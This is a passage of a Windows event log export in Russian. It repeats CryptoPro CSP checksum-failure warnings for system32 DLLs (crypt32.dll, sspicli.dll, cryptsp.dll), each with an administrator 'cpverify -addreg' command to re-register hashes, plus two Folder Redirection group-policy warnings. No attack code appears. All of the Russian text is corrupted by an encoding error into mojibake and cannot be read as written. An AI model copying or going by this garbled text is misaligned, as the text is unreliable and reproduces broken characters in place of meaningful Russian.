–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP.  –û–±–Ω–æ–≤–∏—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–µ —Å—É–º–º—ã —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–∫–∏ ""–ü–µ—Ä–µ—Å—á–∏
—Ç–∞—Ç—å —Ö—ç—à–∏"" –≤ –ø–∞–Ω–µ–ª–∏ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP –Ω–∞ –≤–∫–ª–∞–¥–∫–µ ""–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ"" –∏–ª–∏ –ø–µ—Ä–µ—Å—á–∏—Ç–∞–π—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—É—é —Å—É–º–º—É –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤ —Ä–µ–µ—Å—Ç—Ä–µ, –∑–∞
–ø—É—Å—Ç–∏–≤ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞: start cpverify -addreg -file ""C:\Windows\system32\crypt32.dll""
         –í–æ–∑–Ω–∏–∫–ª–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ö–æ–¥ —Å–æ–±—ã—Ç–∏—è (EventID): 0x81150124
            –í—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è: 04/08/2024   11:02:04
            –°—Ç—Ä–æ–∫–∞ —Å–æ–±—ã—Ç–∏—è:
            –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–π —Å—É–º–º—ã. –§–∞–π–ª: C:\Windows\system32\sspicli.dll. –ü—Ä–∏—á–∏–Ω–æ–π –æ—à–∏–±–∫–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ
–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP.  –û–±–Ω–æ–≤–∏—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–µ —Å—É–º–º—ã —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–∫–∏ ""–ü–µ—Ä–µ—Å—á–∏
—Ç–∞—Ç—å —Ö—ç—à–∏"" –≤ –ø–∞–Ω–µ–ª–∏ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP –Ω–∞ –≤–∫–ª–∞–¥–∫–µ ""–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ"" –∏–ª–∏ –ø–µ—Ä–µ—Å—á–∏—Ç–∞–π—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—É—é —Å—É–º–º—É –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤ —Ä–µ–µ—Å—Ç—Ä–µ, –∑–∞
–ø—É—Å—Ç–∏–≤ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞: start cpverify -addreg -file ""C:\Windows\system32\sspicli.dll""
         –í–æ–∑–Ω–∏–∫–ª–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ö–æ–¥ —Å–æ–±—ã—Ç–∏—è (EventID): 0x00000458
            –í—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è: 04/08/2024   11:04:15
            –°—Ç—Ä–æ–∫–∞ —Å–æ–±—ã—Ç–∏—è:
            –ö–ª–∏–µ–Ω—Ç—Å–∫–æ–º—É —Ä–∞—Å—à–∏—Ä–µ–Ω–∏—é ""Folder Redirection"" –≥—Ä—É–ø–ø–æ–≤–æ–π –ø–æ–ª–∏—Ç–∏–∫–∏ –Ω–µ —É–¥–∞–ª–æ—Å—å –ø—Ä–∏–º–µ–Ω–∏—Ç—å –æ–¥–∏–Ω –∏–ª–∏ –Ω–µ—Å–∫–æ–ª—å–∫–æ –ø–∞—Ä–∞–º
–µ—Ç—Ä–æ–≤, –ø–æ—Å–∫–æ–ª—å–∫—É —ç—Ç–∏ –∏–∑–º–µ–Ω–µ–Ω–∏—è –¥–æ–ª–∂–Ω—ã –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞—Ç—å—Å—è –¥–æ –∑–∞–ø—É—Å–∫–∞ —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –¥–æ –≤—Ö–æ–¥–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è. –ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ –æ–±—Ä–∞–±–æ—Ç–∫–∏
–≥—Ä—É–ø–ø–æ–≤–æ–π –ø–æ–ª–∏—Ç–∏–∫–∏ –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–æ –ø–µ—Ä–µ–¥ —Å–ª–µ–¥—É—é—â–∏–º –∑–∞–ø—É—Å–∫–æ–º —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –≤—Ö–æ–¥–æ–º —ç—Ç–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, —á—Ç–æ –º–æ–∂–µ—Ç –≤—ã–∑–≤–∞—Ç—å –∑–∞–º
–µ–¥–ª–µ–Ω–∏–µ –∑–∞–≥—Ä—É–∑–∫–∏ –∏ –∑–∞–ø—É—Å–∫–∞ —Å–∏—Å—Ç–µ–º—ã.
         –í–æ–∑–Ω–∏–∫–ª–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ö–æ–¥ —Å–æ–±—ã—Ç–∏—è (EventID): 0x00000458
            –í—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è: 04/08/2024   11:08:25
            –°—Ç—Ä–æ–∫–∞ —Å–æ–±—ã—Ç–∏—è:
            –ö–ª–∏–µ–Ω—Ç—Å–∫–æ–º—É —Ä–∞—Å—à–∏—Ä–µ–Ω–∏—é ""Folder Redirection"" –≥—Ä—É–ø–ø–æ–≤–æ–π –ø–æ–ª–∏—Ç–∏–∫–∏ –Ω–µ —É–¥–∞–ª–æ—Å—å –ø—Ä–∏–º–µ–Ω–∏—Ç—å –æ–¥–∏–Ω –∏–ª–∏ –Ω–µ—Å–∫–æ–ª—å–∫–æ –ø–∞—Ä–∞–º
–µ—Ç—Ä–æ–≤, –ø–æ—Å–∫–æ–ª—å–∫—É —ç—Ç–∏ –∏–∑–º–µ–Ω–µ–Ω–∏—è –¥–æ–ª–∂–Ω—ã –æ–±—Ä–∞–±–∞—Ç—ã–≤–∞—Ç—å—Å—è –¥–æ –∑–∞–ø—É—Å–∫–∞ —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –¥–æ –≤—Ö–æ–¥–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è. –ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ –æ–±—Ä–∞–±–æ—Ç–∫–∏
–≥—Ä—É–ø–ø–æ–≤–æ–π –ø–æ–ª–∏—Ç–∏–∫–∏ –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–æ –ø–µ—Ä–µ–¥ —Å–ª–µ–¥—É—é—â–∏–º –∑–∞–ø—É—Å–∫–æ–º —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –≤—Ö–æ–¥–æ–º —ç—Ç–æ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, —á—Ç–æ –º–æ–∂–µ—Ç –≤—ã–∑–≤–∞—Ç—å –∑–∞–º
–µ–¥–ª–µ–Ω–∏–µ –∑–∞–≥—Ä—É–∑–∫–∏ –∏ –∑–∞–ø—É—Å–∫–∞ —Å–∏—Å—Ç–µ–º—ã.
         –í–æ–∑–Ω–∏–∫–ª–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ö–æ–¥ —Å–æ–±—ã—Ç–∏—è (EventID): 0x81150124
            –í—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è: 04/08/2024   11:17:01
            –°—Ç—Ä–æ–∫–∞ —Å–æ–±—ã—Ç–∏—è:
            –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–π —Å—É–º–º—ã. –§–∞–π–ª: C:\Windows\system32\cryptsp.dll. –ü—Ä–∏—á–∏–Ω–æ–π –æ—à–∏–±–∫–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ
–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP.  –û–±–Ω–æ–≤–∏—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–µ —Å—É–º–º—ã —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–∫–∏ ""–ü–µ—Ä–µ—Å—á–∏
—Ç–∞—Ç—å —Ö—ç—à–∏"" –≤ –ø–∞–Ω–µ–ª–∏ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP –Ω–∞ –≤–∫–ª–∞–¥–∫–µ ""–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ"" –∏–ª–∏ –ø–µ—Ä–µ—Å—á–∏—Ç–∞–π—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—É—é —Å—É–º–º—É –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤ —Ä–µ–µ—Å—Ç—Ä–µ, –∑–∞
–ø—É—Å—Ç–∏–≤ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞: start cpverify -addreg -file ""C:\Windows\system32\cryptsp.dll""
         –í–æ–∑–Ω–∏–∫–ª–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ö–æ–¥ —Å–æ–±—ã—Ç–∏—è (EventID): 0x81150124
            –í—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è: 04/08/2024   11:23:00
            –°—Ç—Ä–æ–∫–∞ —Å–æ–±—ã—Ç–∏—è:
            –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–π —Å—É–º–º—ã. –§–∞–π–ª: C:\Windows\system32\cryptsp.dll. –ü—Ä–∏—á–∏–Ω–æ–π –æ—à–∏–±–∫–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ
–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP.  –û–±–Ω–æ–≤–∏—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–µ —Å—É–º–º—ã —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–∫–∏ ""–ü–µ—Ä–µ—Å—á–∏
—Ç–∞—Ç—å —Ö—ç—à–∏"" –≤ –ø–∞–Ω–µ–ª–∏ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP –Ω–∞ –≤–∫–ª–∞–¥–∫–µ ""–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ"" –∏–ª–∏ –ø–µ—Ä–µ—Å—á–∏—Ç–∞–π—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—É—é —Å—É–º–º—É –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤ —Ä–µ–µ—Å—Ç—Ä–µ, –∑–∞
–ø—É—Å—Ç–∏–≤ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞: start cpverify -addreg -file ""C:\Windows\system32\cryptsp.dll""
         –í–æ–∑–Ω–∏–∫–ª–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ö–æ–¥ —Å–æ–±—ã—Ç–∏—è (EventID): 0x81150124
            –í—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è: 04/08/2024   11:23:00
            –°—Ç—Ä–æ–∫–∞ —Å–æ–±—ã—Ç–∏—è:
            –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–π —Å—É–º–º—ã. –§–∞–π–ª: C:\Windows\system32\sspicli.dll. –ü—Ä–∏—á–∏–Ω–æ–π –æ—à–∏–±–∫–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ
–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP.  –û–±–Ω–æ–≤–∏—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–µ —Å—É–º–º—ã —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–∫–∏ ""–ü–µ—Ä–µ—Å—á–∏
—Ç–∞—Ç—å —Ö—ç—à–∏"" –≤ –ø–∞–Ω–µ–ª–∏ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP –Ω–∞ –≤–∫–ª–∞–¥–∫–µ ""–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ"" –∏–ª–∏ –ø–µ—Ä–µ—Å—á–∏—Ç–∞–π—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—É—é —Å—É–º–º—É –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤ —Ä–µ–µ—Å—Ç—Ä–µ, –∑–∞
–ø—É—Å—Ç–∏–≤ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞: start cpverify -addreg -file ""C:\Windows\system32\sspicli.dll""
         –í–æ–∑–Ω–∏–∫–ª–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ö–æ–¥ —Å–æ–±—ã—Ç–∏—è (EventID): 0x81150124
            –í—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è: 04/08/2024   11:23:00
            –°—Ç—Ä–æ–∫–∞ —Å–æ–±—ã—Ç–∏—è:
            –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–π —Å—É–º–º—ã. –§–∞–π–ª: C:\Windows\system32\sspicli.dll. –ü—Ä–∏—á–∏–Ω–æ–π –æ—à–∏–±–∫–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ
–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP.  –û–±–Ω–æ–≤–∏—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–µ —Å—É–º–º—ã —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–∫–∏ ""–ü–µ—Ä–µ—Å—á–∏
—Ç–∞—Ç—å —Ö—ç—à–∏"" –≤ –ø–∞–Ω–µ–ª–∏ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP –Ω–∞ –≤–∫–ª–∞–¥–∫–µ ""–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ"" –∏–ª–∏ –ø–µ—Ä–µ—Å—á–∏—Ç–∞–π—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—É—é —Å—É–º–º—É –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤ —Ä–µ–µ—Å—Ç—Ä–µ, –∑–∞
–ø—É—Å—Ç–∏–≤ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞: start cpverify -addreg -file ""C:\Windows\system32\sspicli.dll""
         –í–æ–∑–Ω–∏–∫–ª–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ö–æ–¥ —Å–æ–±—ã—Ç–∏—è (EventID): 0x81150124
            –í—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è: 04/08/2024   11:23:01
            –°—Ç—Ä–æ–∫–∞ —Å–æ–±—ã—Ç–∏—è:
            –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–π —Å—É–º–º—ã. –§–∞–π–ª: C:\Windows\system32\cryptsp.dll. –ü—Ä–∏—á–∏–Ω–æ–π –æ—à–∏–±–∫–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ
–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP.  –û–±–Ω–æ–≤–∏—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–µ —Å—É–º–º—ã —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–∫–∏ ""–ü–µ—Ä–µ—Å—á–∏
—Ç–∞—Ç—å —Ö—ç—à–∏"" –≤ –ø–∞–Ω–µ–ª–∏ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP –Ω–∞ –≤–∫–ª–∞–¥–∫–µ ""–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ"" –∏–ª–∏ –ø–µ—Ä–µ—Å—á–∏—Ç–∞–π—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—É—é —Å—É–º–º—É –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤ —Ä–µ–µ—Å—Ç—Ä–µ, –∑–∞
–ø—É—Å—Ç–∏–≤ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞: start cpverify -addreg -file ""C:\Windows\system32\cryptsp.dll""
         –í–æ–∑–Ω–∏–∫–ª–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ö–æ–¥ —Å–æ–±—ã—Ç–∏—è (EventID): 0x81150124
            –í—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è: 04/08/2024   11:23:01
            –°—Ç—Ä–æ–∫–∞ —Å–æ–±—ã—Ç–∏—è:
            –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–π —Å—É–º–º—ã. –§–∞–π–ª: C:\Windows\system32\sspicli.dll. –ü—Ä–∏—á–∏–Ω–æ–π –æ—à–∏–±–∫–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ
–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP.  –û–±–Ω–æ–≤–∏—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–µ —Å—É–º–º—ã —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–∫–∏ ""–ü–µ—Ä–µ—Å—á–∏
—Ç–∞—Ç—å —Ö—ç—à–∏"" –≤ –ø–∞–Ω–µ–ª–∏ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP –Ω–∞ –≤–∫–ª–∞–¥–∫–µ ""–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ"" –∏–ª–∏ –ø–µ—Ä–µ—Å—á–∏—Ç–∞–π—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—É—é —Å—É–º–º—É –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤ —Ä–µ–µ—Å—Ç—Ä–µ, –∑–∞
–ø—É—Å—Ç–∏–≤ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞: start cpverify -addreg -file ""C:\Windows\system32\sspicli.dll""
         –í–æ–∑–Ω–∏–∫–ª–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ö–æ–¥ —Å–æ–±—ã—Ç–∏—è (EventID): 0x81150124
            –í—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è: 04/08/2024   11:23:04
            –°—Ç—Ä–æ–∫–∞ —Å–æ–±—ã—Ç–∏—è:
            –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–π —Å—É–º–º—ã. –§–∞–π–ª: C:\Windows\system32\cryptsp.dll. –ü—Ä–∏—á–∏–Ω–æ–π –æ—à–∏–±–∫–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ
–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP.  –û–±–Ω–æ–≤–∏—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–µ —Å—É–º–º—ã —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–∫–∏ ""–ü–µ—Ä–µ—Å—á–∏
—Ç–∞—Ç—å —Ö—ç—à–∏"" –≤ –ø–∞–Ω–µ–ª–∏ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP –Ω–∞ –≤–∫–ª–∞–¥–∫–µ ""–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ"" –∏–ª–∏ –ø–µ—Ä–µ—Å—á–∏—Ç–∞–π—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—É—é —Å—É–º–º—É –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤ —Ä–µ–µ—Å—Ç—Ä–µ, –∑–∞
–ø—É—Å—Ç–∏–≤ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞: start cpverify -addreg -file ""C:\Windows\system32\cryptsp.dll""
         –í–æ–∑–Ω–∏–∫–ª–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ö–æ–¥ —Å–æ–±—ã—Ç–∏—è (EventID): 0x81150124
            –í—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è: 04/08/2024   11:23:04
            –°—Ç—Ä–æ–∫–∞ —Å–æ–±—ã—Ç–∏—è:
            –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–π —Å—É–º–º—ã. –§–∞–π–ª: C:\Windows\system32\cryptsp.dll. –ü—Ä–∏—á–∏–Ω–æ–π –æ—à–∏–±–∫–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ
–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP.  –û–±–Ω–æ–≤–∏—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–µ —Å—É–º–º—ã —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–∫–∏ ""–ü–µ—Ä–µ—Å—á–∏
—Ç–∞—Ç—å —Ö—ç—à–∏"" –≤ –ø–∞–Ω–µ–ª–∏ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP –Ω–∞ –≤–∫–ª–∞–¥–∫–µ ""–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ"" –∏–ª–∏ –ø–µ—Ä–µ—Å—á–∏—Ç–∞–π—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—É—é —Å—É–º–º—É –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤ —Ä–µ–µ—Å—Ç—Ä–µ, –∑–∞
–ø—É—Å—Ç–∏–≤ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞: start cpverify -addreg -file ""C:\Windows\system32\cryptsp.dll""
         –í–æ–∑–Ω–∏–∫–ª–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ö–æ–¥ —Å–æ–±—ã—Ç–∏—è (EventID): 0x81150124
            –í—Ä–µ–º—è —Å–æ–∑–¥–∞–Ω–∏—è: 04/08/2024   11:23:04
            –°—Ç—Ä–æ–∫–∞ —Å–æ–±—ã—Ç–∏—è:
            –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω–æ–π —Å—É–º–º—ã. –§–∞–π–ª: C:\Windows\system32\sspicli.dll. –ü—Ä–∏—á–∏–Ω–æ–π –æ—à–∏–±–∫–∏ –º–æ–∂–µ—Ç –±—ã—Ç—å –æ–±–Ω–æ–≤–ª–µ
–Ω–∏–µ –æ–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–æ–π —Å–∏—Å—Ç–µ–º—ã –∏–ª–∏ –Ω–µ–∫–æ—Ä—Ä–µ–∫—Ç–Ω–∞—è —É—Å—Ç–∞–Ω–æ–≤–∫–∞ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP.  –û–±–Ω–æ–≤–∏—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—ã–µ —Å—É–º–º—ã —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–∫–∏ ""–ü–µ—Ä–µ—Å—á–∏
—Ç–∞—Ç—å —Ö—ç—à–∏"" –≤ –ø–∞–Ω–µ–ª–∏ –ö—Ä–∏–ø—Ç–æ–ü—Ä–æ CSP –Ω–∞ –≤–∫–ª–∞–¥–∫–µ ""–î–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ"" –∏–ª–∏ –ø–µ—Ä–µ—Å—á–∏—Ç–∞–π—Ç–µ –∫–æ–Ω—Ç—Ä–æ–ª—å–Ω—É—é —Å—É–º–º—É –±–∏–±–ª–∏–æ—Ç–µ–∫–∏ –≤ —Ä–µ–µ—Å—Ç—Ä–µ, –∑–∞
–ø—É—Å—Ç–∏–≤ —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞: start cpverify -addreg -file ""C:\Windows\system32\sspicli.dll""
         –í–æ–∑–Ω–∏–∫–ª–æ –ø—Ä–µ–¥—É–ø—Ä–µ–∂–¥–µ–Ω–∏–µ. –ö–æ–¥ —Å–æ–±—ã—Ç–∏—è (EventID): 0x81150124
